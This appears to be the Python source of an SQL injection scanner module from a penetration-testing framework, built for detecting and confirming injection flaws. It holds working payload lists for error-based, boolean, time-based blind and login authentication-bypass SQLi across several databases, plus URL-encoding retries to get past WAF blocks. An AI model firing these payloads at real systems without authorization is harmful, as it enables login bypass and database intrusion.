"""SQLi scanner — structured verification chain from the VAPT guide.

Verification Chain (per param, one at a time):
  Step 1 - BREAK:     Inject ' → expect 500 / DB error string
  Step 2 - FIX:       Inject '' → expect 200 restored (proves input reaches SQL)
  Step 3 - BOOLEAN:   AND 1=1 vs AND 1=2 → compare response lengths
  Step 4 - TIME:      SLEEP/WAITFOR/pg_sleep → measure response time delta

GO/NO-GO logic:
  - If BREAK fails → STOP, this param is not injectable
  - If BREAK passes but FIX fails → NEEDS_HUMAN (might be WAF or double-encoding)
  - If BREAK+FIX both pass → CONFIRMED (even without boolean/time)
  - Boolean and time-based add extra confidence

Rules from the guide:
  - One parameter at a time
  - Separate GET and POST logic (query vs body injection)
  - Try payloads from list in order, stop on first success
  - Minimize noise (2-4 requests per payload)
  - Encode on WAF block (403 → URL-encode ONCE, then move on)
  - Log everything

Also handles:
  - Redirect-based auth bypass (login forms with 302 redirects)
  - Time-based blind SQLi (SLEEP, WAITFOR DELAY, pg_sleep)
  - WAF bypass with URL encoding
"""
from __future__ import annotations

import logging
import time
from typing import Any
from urllib.parse import quote

from ..http import HttpClient, Session
from ..recipes.schema import Recipe
from .base import Scanner, Candidate

logger = logging.getLogger(__name__)

# ── Payloads ──────────────────────────────────────────────────

# Step 1: BREAK payloads (try in order, stop on first success)
_BREAK_PAYLOADS = [
    "'",
    "\"",
    "' OR '",
    "1'",
    "1\"",
]

# Step 2: FIX payloads (corresponding to each break payload)
_FIX_MAP = {
    "'": "''",
    "\"": "\"\"",
    "' OR '": "'' OR ''",
    "1'": "1''",
    "1\"": "1\"\"",
}

# Step 3: Boolean pairs (true_condition, false_condition)
_BOOLEAN_PAIRS = [
    ("' OR '1'='1' --", "' OR '1'='2' --"),
    ("1 OR 1=1", "1 OR 1=2"),
    ("' OR 1=1 #", "' OR 1=2 #"),
    ("1 AND 1=1", "1 AND 1=2"),
]

# Step 4: Time-based payloads per DB type
_TIME_PAYLOADS = {
    "mysql": [
        "' OR SLEEP(5) --",
        "1' AND SLEEP(5) --",
        "'; SELECT SLEEP(5) --",
    ],
    "mssql": [
        "'; WAITFOR DELAY '0:0:5' --",
        "1; WAITFOR DELAY '0:0:5' --",
    ],
    "postgresql": [
        "'; SELECT pg_sleep(5) --",
        "1; SELECT pg_sleep(5) --",
        "' OR pg_sleep(5) IS NOT NULL --",
    ],
    "oracle": [
        "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5) --",
    ],
    "sqlite": [
        "' OR randomblob(500000000) IS NOT NULL --",
    ],
    "generic": [
        "' OR SLEEP(5) --",
        "'; WAITFOR DELAY '0:0:5' --",
        "'; SELECT pg_sleep(5) --",
    ],
}

# DB error signatures (case-insensitive)
_DB_ERRORS = [
    "sql syntax", "mysql", "mariadb", "postgresql", "sqlite",
    "ora-", "oracle", "microsoft sql", "mssql", "unclosed quotation",
    "quoted string not properly terminated", "syntax error",
    "unexpected end of sql", "sqlexception", "jdbc", "odbc",
    "you have an error in your sql",
    "warning: mysql", "valid mysql result",
    "pg_query", "pg_exec", "unterminated quoted string",
]

# Time-based detection threshold (seconds)
_TIME_THRESHOLD = 4.0
_TIME_SLEEP = 5


class SqliScanner(Scanner):
    """Detects SQL injection using the structured verification chain.

    For each parameter (one at a time):
    1. BREAK: inject error-triggering payload → check for 500/DB error
    2. FIX: inject escaped payload → check for 200 restored
    3. BOOLEAN: true/false condition → compare response lengths
    4. TIME: sleep injection → measure response time

    Special handling:
    - Login forms: redirect-based auth bypass detection
    - WAF: URL-encode on 403, try once more
    """

    vuln_classes = ["sqli", "sql-injection"]

    def __init__(self, client: HttpClient, session: Session):
        super().__init__(client)
        self.session = session

    async def _detect(self, target: str, recipe: Recipe,
                      **context: Any) -> list[Candidate]:
        params = context.get("params", [])
        method = context.get("method", "GET")
        id_location = context.get("id_location", "query")

        # Use injection_points from classifier if available
        injection_points = context.get("injection_points", [])

        if not params and not injection_points:
            return []

        candidates = []

        if injection_points:
            # Smart mode: use classified injection points
            for point in injection_points:
                if "sqli" not in point.get("vuln_classes", []) and \
                   "sql-injection" not in point.get("vuln_classes", []):
                    continue  # Skip params not flagged for SQLi

                param = point["param"]
                loc = point.get("location", id_location)
                meth = point.get("method", method)
                siblings = point.get("sibling_fields", {})

                result = await self._test_param(
                    target, param, meth, loc, recipe, siblings=siblings
                )
                if result:
                    candidates.append(result)
        else:
            # Fallback: test all params (legacy mode)
            siblings = context.get("siblings", {})
            for param in params:
                result = await self._test_param(
                    target, param, method, id_location, recipe,
                    siblings=siblings,
                )
                if result:
                    candidates.append(result)

        return candidates

    async def _test_param(
        self,
        target: str,
        param: str,
        method: str,
        id_location: str,
        recipe: Recipe,
        *,
        siblings: dict[str, str] | None = None,
    ) -> Candidate | None:
        """Run the full verification chain on a single parameter.

        Chain: BREAK → FIX → BOOLEAN → TIME
        GO/NO-GO at each step.

        Args:
            siblings: Other form fields to include with default values.
                      E.g. when testing 'username' for SQLi on a login form,
                      siblings={'password': 'test123'} so the form processes.
        """
        log = {"param": param, "method": method, "location": id_location, "steps": []}

        # ── Step 0: Get baseline response ──
        # Send TWO baselines: one with follow_redirects=False to detect
        # redirect-based endpoints (login forms), one with follow_redirects=True
        # for body-based error detection on the final page.
        try:
            baseline_raw = await self._send(
                target, param, "normalvalue123", method, id_location,
                siblings=siblings, follow_redirects=False,
            )
            raw_status = baseline_raw.status_code
            baseline_loc = baseline_raw.headers.get("location", "")
            is_redirect = 300 <= raw_status < 400

            if is_redirect:
                # Also get the followed-redirect response for body comparison
                baseline = await self._send(
                    target, param, "normalvalue123", method, id_location,
                    siblings=siblings,
                )
            else:
                baseline = baseline_raw

            baseline_status = baseline.status_code
            baseline_len = len(baseline.text)
            baseline_body = baseline.text[:3000].lower()
        except Exception as e:
            logger.debug("Baseline request failed for %s/%s: %s", target, param, e)
            return None

        # ── Step 1: BREAK ──
        break_result = await self._step_break(
            target, param, method, id_location, baseline_status, baseline_body,
            siblings=siblings,
        )
        log["steps"].append({"step": "break", "result": break_result})

        if not break_result["success"]:
            # BREAK failed — no visible SQL error.  Try blind detection:
            #   a) Redirect-based auth bypass (login returns 3xx)
            #   b) Response-body-based auth bypass (login returns 200)
            #   c) Boolean-based blind (response length diff)
            #   d) Time-based blind (SLEEP injection)

            if is_redirect:
                redirect_result = await self._step_redirect_bypass(
                    target, param, method, id_location, baseline_loc, baseline_status,
                    siblings=siblings,
                )
                if redirect_result and redirect_result.get("success"):
                    return self._make_candidate(
                        recipe=recipe,
                        endpoint=target,
                        method=method,
                        evidence={
                            "technique": "redirect-based",
                            "chain": log,
                            **redirect_result,
                        },
                        confidence="high",
                        request_data={
                            "param": param,
                            "payload_true": redirect_result["payload_true"],
                            "payload_false": redirect_result["payload_false"],
                            "id_location": id_location,
                            "technique": "redirect-based",
                            "sibling_fields": siblings or {},
                            "full_request": redirect_result.get("full_request", ""),
                        },
                        response_data={
                            "status": redirect_result.get("true_status"),
                            "true_location": redirect_result.get("true_location"),
                            "false_location": redirect_result.get("false_location"),
                            "full_response": redirect_result.get("full_response", ""),
                        },
                    )

            # b) Response-body auth bypass (for 200-based login forms)
            body_bypass = await self._step_body_auth_bypass(
                target, param, method, id_location,
                baseline_len, baseline_body, baseline_status,
                siblings=siblings,
            )
            log["steps"].append({"step": "body_auth_bypass", "result": body_bypass or {}})
            if body_bypass and body_bypass.get("success"):
                return self._make_candidate(
                    recipe=recipe,
                    endpoint=target,
                    method=method,
                    evidence={
                        "technique": "auth-bypass-body",
                        "chain": log,
                        "detail": (
                            f"SQL injection auth bypass: payload '{body_bypass['payload_true']}' "
                            f"produced a significantly different response "
                            f"({body_bypass['true_length']} bytes vs {body_bypass['false_length']} bytes), "
                            f"indicating successful authentication bypass."
                        ),
                        **body_bypass,
                    },
                    confidence="high",
                    request_data={
                        "param": param,
                        "payload": body_bypass["payload_true"],
                        "payload_true": body_bypass["payload_true"],
                        "payload_false": body_bypass["payload_false"],
                        "id_location": id_location,
                        "technique": "auth-bypass",
                        "sibling_fields": siblings or {},
                        "full_request": body_bypass.get("full_request", ""),
                    },
                    response_data={
                        "status": body_bypass.get("true_status"),
                        "true_length": body_bypass.get("true_length"),
                        "false_length": body_bypass.get("false_length"),
                        "full_response": body_bypass.get("full_response", ""),
                    },
                )

            # c) Boolean-based blind (generic — response length diff)
            bool_result = await self._step_boolean(
                target, param, method, id_location, siblings=siblings,
            )
            log["steps"].append({"step": "boolean_blind", "result": bool_result})
            if bool_result.get("success"):
                # d) Confirm with time-based before calling it confirmed
                time_result = await self._step_time(
                    target, param, method, id_location, "generic", siblings=siblings,
                )
                log["steps"].append({"step": "time_blind", "result": time_result})

                confidence = "high" if time_result.get("success") else "medium"
                return self._make_candidate(
                    recipe=recipe,
                    endpoint=target,
                    method=method,
                    evidence={
                        "technique": "boolean-blind",
                        "chain": log,
                        "boolean_confirmed": True,
                        "time_confirmed": time_result.get("success", False),
                        "detail": (
                            f"Blind SQL injection: boolean payloads produce different response "
                            f"lengths ({bool_result.get('true_length')} vs "
                            f"{bool_result.get('false_length')} bytes, "
                            f"diff={bool_result.get('diff')} bytes)."
                        ),
                    },
                    confidence=confidence,
                    request_data={
                        "param": param,
                        "payload": bool_result.get("payload_true", ""),
                        "id_location": id_location,
                        "technique": "boolean-blind",
                        "sibling_fields": siblings or {},
                    },
                    response_data={
                        "true_length": bool_result.get("true_length"),
                        "false_length": bool_result.get("false_length"),
                        "diff": bool_result.get("diff"),
                    },
                )

            # d) Time-based blind as last resort
            time_result = await self._step_time(
                target, param, method, id_location, "generic", siblings=siblings,
            )
            log["steps"].append({"step": "time_blind_only", "result": time_result})
            if time_result.get("success"):
                return self._make_candidate(
                    recipe=recipe,
                    endpoint=target,
                    method=method,
                    evidence={
                        "technique": "time-blind",
                        "chain": log,
                        "time_confirmed": True,
                        "detail": (
                            f"Time-based blind SQL injection: SLEEP payload caused "
                            f"{time_result['delta']:.1f}s delay "
                            f"(baseline: {time_result['baseline_time']:.1f}s)."
                        ),
                    },
                    confidence="high",
                    request_data={
                        "param": param,
                        "payload": time_result.get("payload", ""),
                        "id_location": id_location,
                        "technique": "time-blind",
                        "sibling_fields": siblings or {},
                    },
                    response_data={
                        "elapsed": time_result.get("elapsed"),
                        "baseline_time": time_result.get("baseline_time"),
                        "delta": time_result.get("delta"),
                    },
                )

            logger.debug("All blind SQLi checks failed for %s/%s", target, param)
            return None

        # ── Step 2: FIX ──
        fix_result = await self._step_fix(
            target, param, method, id_location,
            break_result["payload"], baseline_status, baseline_body,
            siblings=siblings,
        )
        log["steps"].append({"step": "fix", "result": fix_result})

        if break_result["success"] and fix_result["success"]:
            # BREAK+FIX confirmed — this IS SQLi
            technique = "error-based"
            confidence = "high"

            # ── Step 3: BOOLEAN (optional, adds confidence) ──
            bool_result = await self._step_boolean(
                target, param, method, id_location, siblings=siblings
            )
            log["steps"].append({"step": "boolean", "result": bool_result})

            # ── Step 4: TIME (optional, adds confidence) ──
            db_type = break_result.get("db_type", "generic")
            time_result = await self._step_time(
                target, param, method, id_location, db_type, siblings=siblings
            )
            log["steps"].append({"step": "time", "result": time_result})

            return self._make_candidate(
                recipe=recipe,
                endpoint=target,
                method=method,
                evidence={
                    "technique": technique,
                    "chain": log,
                    "db_type": break_result.get("db_type"),
                    "error_match": break_result.get("error_match"),
                    "boolean_confirmed": bool_result.get("success", False),
                    "time_confirmed": time_result.get("success", False),
                    "body_snippet": break_result.get("body_snippet", ""),
                },
                confidence=confidence,
                request_data={
                    "param": param,
                    "payload": break_result["payload"],
                    "fix_payload": fix_result.get("payload", ""),
                    "id_location": id_location,
                    "technique": technique,
                    "sibling_fields": siblings or {},
                    "full_request": break_result.get("full_request", ""),
                },
                response_data={
                    "status": break_result.get("status"),
                    "error_match": break_result.get("error_match"),
                    "break_status": break_result.get("status"),
                    "fix_status": fix_result.get("status"),
                    "full_response": break_result.get("full_response", ""),
                },
            )

        elif break_result["success"] and not fix_result["success"]:
            # BREAK passed but FIX failed → might be WAF or encoding issue
            # → NEEDS_HUMAN
            return self._make_candidate(
                recipe=recipe,
                endpoint=target,
                method=method,
                evidence={
                    "technique": "error-based-partial",
                    "chain": log,
                    "note": "BREAK passed but FIX failed — may need manual verification",
                    "db_type": break_result.get("db_type"),
                    "error_match": break_result.get("error_match"),
                },
                confidence="medium",
                request_data={
                    "param": param,
                    "payload": break_result["payload"],
                    "id_location": id_location,
                    "technique": "error-based",
                    "sibling_fields": siblings or {},
                    "full_request": break_result.get("full_request", ""),
                },
                response_data={
                    "status": break_result.get("status"),
                    "error_match": break_result.get("error_match"),
                    "full_response": break_result.get("full_response", ""),
                },
            )

        return None

    # ── Chain steps ──────────────────────────────────────────────

    async def _step_break(
        self, target: str, param: str, method: str, id_location: str,
        baseline_status: int, baseline_body: str,
        *, siblings: dict[str, str] | None = None,
    ) -> dict:
        """Step 1: BREAK — inject error-triggering payload.

        Success: response has a DB error string OR status changed to 500.
        """
        for payload in _BREAK_PAYLOADS:
            try:
                resp = await self._send(target, param, payload, method, id_location, siblings=siblings)
                body = resp.text[:3000].lower()
                status = resp.status_code

                # Check for WAF block → try URL-encoded once
                if status == 403:
                    encoded = quote(payload, safe="")
                    resp = await self._send(target, param, encoded, method, id_location, siblings=siblings)
                    body = resp.text[:3000].lower()
                    status = resp.status_code
                    if status == 403:
                        continue  # WAF still blocks, move to next payload

                # Check for DB error strings
                for error_sig in _DB_ERRORS:
                    if error_sig in body and error_sig not in baseline_body:
                        db_type = self._identify_db(body)
                        return {
                            "success": True,
                            "payload": payload,
                            "status": status,
                            "error_match": error_sig,
                            "db_type": db_type,
                            "body_snippet": resp.text[:500],
                            "full_request": self.capture_request(resp),
                            "full_response": self.capture_response(resp),
                        }

                # Also count: status changed from 200→500
                if baseline_status == 200 and status == 500:
                    return {
                        "success": True,
                        "payload": payload,
                        "status": status,
                        "error_match": "status_500",
                        "db_type": self._identify_db(body),
                        "body_snippet": resp.text[:500],
                        "full_request": self.capture_request(resp),
                        "full_response": self.capture_response(resp),
                    }

            except Exception as e:
                logger.debug("BREAK error for %s/%s payload=%s: %s",
                             target, param, payload, e)
                continue

        return {"success": False}

    async def _step_fix(
        self, target: str, param: str, method: str, id_location: str,
        break_payload: str, baseline_status: int, baseline_body: str,
        *, siblings: dict[str, str] | None = None,
    ) -> dict:
        """Step 2: FIX — inject escaped version, expect normal response restored.

        Success: status returns to baseline (e.g., 200) and no DB error in body.
        """
        fix_payload = _FIX_MAP.get(break_payload, break_payload + break_payload)

        try:
            resp = await self._send(target, param, fix_payload, method, id_location, siblings=siblings)
            body = resp.text[:3000].lower()
            status = resp.status_code

            # Check: status restored to baseline
            status_restored = (status == baseline_status) or (
                # Also accept: both are 2xx
                200 <= status < 300 and 200 <= baseline_status < 300
            )

            # Check: no DB error in response
            has_error = any(sig in body for sig in _DB_ERRORS)

            if status_restored and not has_error:
                return {
                    "success": True,
                    "payload": fix_payload,
                    "status": status,
                }
            else:
                return {
                    "success": False,
                    "payload": fix_payload,
                    "status": status,
                    "reason": "status_not_restored" if not status_restored else "error_still_present",
                }

        except Exception as e:
            logger.debug("FIX error for %s/%s: %s", target, param, e)
            return {"success": False, "error": str(e)}

    async def _step_boolean(
        self, target: str, param: str, method: str, id_location: str,
        *, siblings: dict[str, str] | None = None,
    ) -> dict:
        """Step 3: BOOLEAN — true/false condition comparison.

        Success: significant response length difference between true and false.
        """
        for true_payload, false_payload in _BOOLEAN_PAIRS:
            try:
                true_resp = await self._send(target, param, true_payload, method, id_location, siblings=siblings)
                false_resp = await self._send(target, param, false_payload, method, id_location, siblings=siblings)

                # WAF check
                if true_resp.status_code == 403 or false_resp.status_code == 403:
                    # Try URL-encoded
                    true_resp = await self._send(
                        target, param, quote(true_payload, safe=""), method, id_location, siblings=siblings)
                    false_resp = await self._send(
                        target, param, quote(false_payload, safe=""), method, id_location, siblings=siblings)
                    if true_resp.status_code == 403 or false_resp.status_code == 403:
                        continue

                true_len = len(true_resp.text)
                false_len = len(false_resp.text)
                diff = abs(true_len - false_len)

                if diff > 50 and true_resp.status_code == false_resp.status_code:
                    return {
                        "success": True,
                        "payload_true": true_payload,
                        "payload_false": false_payload,
                        "true_length": true_len,
                        "false_length": false_len,
                        "diff": diff,
                    }

            except Exception as e:
                logger.debug("BOOLEAN error for %s/%s: %s", target, param, e)
                continue

        return {"success": False}

    async def _step_time(
        self, target: str, param: str, method: str, id_location: str,
        db_type: str | None, *, siblings: dict[str, str] | None = None,
    ) -> dict:
        """Step 4: TIME — inject sleep, measure response time delta.

        Success: response takes >= threshold seconds longer than baseline.
        """
        # Pick payloads based on detected DB type
        db_key = (db_type or "generic").lower()
        if "mysql" in db_key or "maria" in db_key:
            payloads = _TIME_PAYLOADS["mysql"]
        elif "mssql" in db_key or "microsoft" in db_key:
            payloads = _TIME_PAYLOADS["mssql"]
        elif "postgres" in db_key:
            payloads = _TIME_PAYLOADS["postgresql"]
        elif "oracle" in db_key:
            payloads = _TIME_PAYLOADS["oracle"]
        elif "sqlite" in db_key:
            payloads = _TIME_PAYLOADS["sqlite"]
        else:
            payloads = _TIME_PAYLOADS["generic"]

        # Get baseline timing first
        try:
            t0 = time.monotonic()
            await self._send(target, param, "normalvalue123", method, id_location, siblings=siblings)
            baseline_time = time.monotonic() - t0
        except Exception:
            baseline_time = 1.0

        for payload in payloads:
            try:
                t0 = time.monotonic()
                resp = await self._send(target, param, payload, method, id_location, siblings=siblings)
                elapsed = time.monotonic() - t0

                # WAF check
                if resp.status_code == 403:
                    t0 = time.monotonic()
                    resp = await self._send(
                        target, param, quote(payload, safe=""), method, id_location, siblings=siblings)
                    elapsed = time.monotonic() - t0
                    if resp.status_code == 403:
                        continue

                delta = elapsed - baseline_time

                if delta >= _TIME_THRESHOLD:
                    return {
                        "success": True,
                        "payload": payload,
                        "elapsed": round(elapsed, 2),
                        "baseline_time": round(baseline_time, 2),
                        "delta": round(delta, 2),
                    }

            except Exception as e:
                logger.debug("TIME error for %s/%s: %s", target, param, e)
                continue

        return {"success": False}

    async def _step_body_auth_bypass(
        self, target: str, param: str, method: str, id_location: str,
        baseline_len: int, baseline_body: str, baseline_status: int,
        *, siblings: dict[str, str] | None = None,
    ) -> dict | None:
        """Response-body auth bypass for login forms that return 200.

        Sends authentication bypass payloads (e.g. ' OR '1'='1' --)
        and compares the response body against the baseline (failed login).
        A significantly different response body = successful auth bypass = SQLi.

        This catches the classic login SQLi that BREAK misses because the
        app catches SQL errors and shows a generic 'login failed' page.
        """
        # Auth bypass payloads — these attempt to make WHERE clause always-true
        _AUTH_BYPASS_PAYLOADS = [
            ("' OR '1'='1' --", "' OR '1'='2' --"),
            ("' OR 1=1 --", "' OR 1=2 --"),
            ("' OR '1'='1'#", "' OR '1'='2'#"),
            ("admin' --", "invaliduser' --"),
            ("' OR 1=1#", "' OR 1=2#"),
            ("1' OR '1'='1", "1' OR '1'='2"),
        ]

        for true_payload, false_payload in _AUTH_BYPASS_PAYLOADS:
            try:
                true_resp = await self._send(
                    target, param, true_payload, method, id_location,
                    siblings=siblings,
                )
                false_resp = await self._send(
                    target, param, false_payload, method, id_location,
                    siblings=siblings,
                )

                # WAF check
                if true_resp.status_code == 403 or false_resp.status_code == 403:
                    true_resp = await self._send(
                        target, param, quote(true_payload, safe=""),
                        method, id_location, siblings=siblings,
                    )
                    false_resp = await self._send(
                        target, param, quote(false_payload, safe=""),
                        method, id_location, siblings=siblings,
                    )
                    if true_resp.status_code == 403 or false_resp.status_code == 403:
                        continue

                true_len = len(true_resp.text)
                false_len = len(false_resp.text)
                true_body = true_resp.text[:3000].lower()
                false_body = false_resp.text[:3000].lower()
                diff = abs(true_len - false_len)

                # Detection: true payload produces a DIFFERENT response than both
                # the false payload AND the baseline (failed login)
                # Key: true response must differ significantly from baseline
                true_vs_baseline = abs(true_len - baseline_len)
                false_vs_baseline = abs(false_len - baseline_len)

                if (diff > 200 and true_vs_baseline > 200 and
                        false_vs_baseline < 100):
                    # true response is very different from baseline/false
                    # → auth bypass worked, this is SQLi

                    # Extra check: look for login-success indicators in true
                    # and login-failure indicators in false
                    success_indicators = [
                        "welcome", "dashboard", "account", "logout",
                        "profile", "my account", "signed in", "logged in",
                    ]
                    failure_indicators = [
                        "invalid", "failed", "incorrect", "error",
                        "wrong", "denied", "try again",
                    ]

                    has_success = any(ind in true_body for ind in success_indicators)
                    has_failure = any(ind in false_body for ind in failure_indicators)

                    # Either explicit indicators OR large body diff is enough
                    if has_success or has_failure or diff > 500:
                        return {
                            "success": True,
                            "payload_true": true_payload,
                            "payload_false": false_payload,
                            "true_length": true_len,
                            "false_length": false_len,
                            "baseline_length": baseline_len,
                            "diff": diff,
                            "has_success_indicators": has_success,
                            "has_failure_indicators": has_failure,
                            "true_status": true_resp.status_code,
                            "false_status": false_resp.status_code,
                            "full_request": self.capture_request(true_resp),
                            "full_response": self.capture_response(true_resp),
                        }

                # Also check: true payload causes a redirect but false doesn't
                # (some apps return 200 for baseline but 302 for successful login)
                if (true_resp.status_code != false_resp.status_code and
                        true_resp.status_code != baseline_status):
                    return {
                        "success": True,
                        "payload_true": true_payload,
                        "payload_false": false_payload,
                        "true_length": true_len,
                        "false_length": false_len,
                        "baseline_length": baseline_len,
                        "diff": diff,
                        "true_status": true_resp.status_code,
                        "false_status": false_resp.status_code,
                        "full_request": self.capture_request(true_resp),
                        "full_response": self.capture_response(true_resp),
                    }

            except Exception as e:
                logger.debug("BODY_AUTH_BYPASS error for %s/%s: %s", target, param, e)
                continue

        return None

    async def _step_redirect_bypass(
        self, target: str, param: str, method: str, id_location: str,
        baseline_loc: str, baseline_status: int,
        *, siblings: dict[str, str] | None = None,
    ) -> dict | None:
        """Redirect-based auth bypass detection for login forms.

        On login forms, a successful SQLi (e.g. ' OR '1'='1) redirects to
        dashboard, while a failed one redirects back to login. Detect by
        comparing Location headers.
        """
        if baseline_status < 300 or baseline_status >= 400:
            return None

        for true_payload, false_payload in _BOOLEAN_PAIRS:
            try:
                true_resp = await self._send(target, param, true_payload, method, id_location, siblings=siblings, follow_redirects=False)
                false_resp = await self._send(target, param, false_payload, method, id_location, siblings=siblings, follow_redirects=False)

                true_loc = (true_resp.headers.get("location") or "").lower()
                false_loc = (false_resp.headers.get("location") or "").lower()
                true_status = true_resp.status_code
                false_status = false_resp.status_code

                # Both should be redirects
                if not (300 <= true_status < 400 and 300 <= false_status < 400):
                    continue

                baseline_loc_lower = baseline_loc.lower()

                # Auth bypass: true condition redirects to a DIFFERENT location
                # than false (and baseline), meaning true condition logged in
                if (true_loc != false_loc and
                        true_loc != baseline_loc_lower and
                        false_loc == baseline_loc_lower):
                    return {
                        "success": True,
                        "payload_true": true_payload,
                        "payload_false": false_payload,
                        "true_location": true_resp.headers.get("location", ""),
                        "false_location": false_resp.headers.get("location", ""),
                        "baseline_location": baseline_loc,
                        "true_status": true_status,
                        "false_status": false_status,
                        "full_request": self.capture_request(true_resp),
                        "full_response": self.capture_response(true_resp),
                    }

            except Exception as e:
                logger.debug("REDIRECT error for %s/%s: %s", target, param, e)
                continue

        return None

    # ── HTTP helper ──────────────────────────────────────────────

    async def _send(self, target: str, param: str, value: str,
                    method: str, id_location: str,
                    *, siblings: dict[str, str] | None = None,
                    follow_redirects: bool | None = None):
        """Send a request with the payload injected at the right location.

        When siblings is provided, all sibling fields are included in the
        request with their default values. This is critical for multi-field
        forms (e.g., login forms that require both username AND password to
        return a proper response/redirect).

        When follow_redirects=False, the raw 3xx response is returned instead
        of following the redirect. Used by redirect-based auth bypass detection.
        """
        redir_kw: dict[str, Any] = {}
        if follow_redirects is not None:
            redir_kw["follow_redirects"] = follow_redirects

        if id_location == "query":
            params = dict(siblings) if siblings else {}
            params[param] = value
            return await self.client.request(
                method, target, session=self.session,
                params=params, **redir_kw,
            )
        elif id_location == "body":
            data = dict(siblings) if siblings else {}
            data[param] = value
            return await self.client.post(
                target, session=self.session,
                data=data, **redir_kw,
            )
        elif id_location == "path":
            url = target.rstrip("/") + f"/{value}"
            return await self.client.request(method, url, session=self.session, **redir_kw)
        else:
            raise ValueError(f"Unknown id_location: {id_location}")

    @staticmethod
    def _identify_db(body: str) -> str | None:
        """Identify the DB type from error strings in the response body."""
        if any(s in body for s in ["mysql", "mariadb"]):
            return "MySQL"
        if any(s in body for s in ["postgresql", "pg_"]):
            return "PostgreSQL"
        if any(s in body for s in ["ora-", "oracle"]):
            return "Oracle"
        if any(s in body for s in ["microsoft sql", "mssql"]):
            return "MSSQL"
        if "sqlite" in body:
            return "SQLite"
        return None
